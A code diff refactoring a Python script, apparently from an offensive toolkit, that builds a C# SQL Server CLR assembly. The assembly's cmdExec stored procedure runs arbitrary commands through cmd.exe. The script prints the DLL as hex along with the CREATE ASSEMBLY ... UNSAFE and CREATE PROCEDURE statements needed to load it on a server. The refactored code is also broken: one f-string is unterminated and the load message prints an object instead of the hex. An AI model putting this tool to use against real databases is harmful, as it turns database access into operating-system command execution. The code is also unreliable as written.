@@ -3,40 +3,56 @@ import ak
 import binascii
 
 FN_BASE = "win_sqlassembly"
-FN_CS = FN_BASE + ".cs"
-FN_DLL = FN_BASE + ".dll"
 
-template = r"""
-using System;
-using Microsoft.SqlServer.Server;
-using System.Data.SqlTypes;
-using System.Diagnostics;
+class SQLAssembly:
+    def __init__(self, base_filename):
+        self.source_filename = base_filename + '.cs'
+        self.compiled_filename = base_filename + '.dll'
 
-public class StoredProcedures
-{
-[Microsoft.SqlServer.Server.SqlProcedure]
-public static void cmdExec (SqlString execCommand) {
-	Process proc = new Process();
-	proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
-	proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
-	proc.StartInfo.UseShellExecute = false;
-	proc.StartInfo.RedirectStandardOutput = true;
-	proc.Start();
-	SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
-	SqlContext.Pipe.SendResultsStart(record);
-	record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
-        SqlContext.Pipe.SendResultsRow(record); SqlContext.Pipe.SendResultsEnd();
-	proc.WaitForExit();
-	proc.Close(); }
-};
-"""
+        self. template = r"""
+        using System;
+        using Microsoft.SqlServer.Server;
+        using System.Data.SqlTypes;
+        using System.Diagnostics;
 
-ak.write_file(FN_CS, template)
-ak.cs_compile(FN_CS, "/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")
+        public class StoredProcedures
+        {
+        [Microsoft.SqlServer.Server.SqlProcedure]
+        public static void cmdExec (SqlString execCommand) {
+                Process proc = new Process();
+                proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
+                proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
+                proc.StartInfo.UseShellExecute = false;
+                proc.StartInfo.RedirectStandardOutput = true;
+                proc.Start();
+                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
+                SqlContext.Pipe.SendResultsStart(record);
+                record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
+                SqlContext.Pipe.SendResultsRow(record); SqlContext.Pipe.SendResultsEnd();
+                proc.WaitForExit();
+                proc.Close(); }
+        };
+        """
 
-# Convert to hex
-with open(FN_DLL, 'rb') as f:
-    content = f.read()
-print(binascii.hexlify(content))
-print("Load with: CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE;")
-print("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
+    def compile(self):
+        ak.write_file(self.source_filename, self.template)
+        ak.cs_compile(self.source_filename, f"/target:library /r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll -o {self.compiled_filename})
+
+    def get_hex(self):
+        with open(self.compiled_filename, 'rb') as f:
+            content = f.read()
+        return binascii.hexlify(content)
+
+
+def main():
+    # Convert to hex
+    s = SQLAssembly(FN_BASE)
+
+    print(s.get_hex())
+
+    print(f"Load with: CREATE ASSEMBLY my_assembly FROM 0x{s}..... WITH PERMISSION_SET = UNSAFE;")
+    print("CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];")
+
+if __name__ == "__main__":
+    main()
+
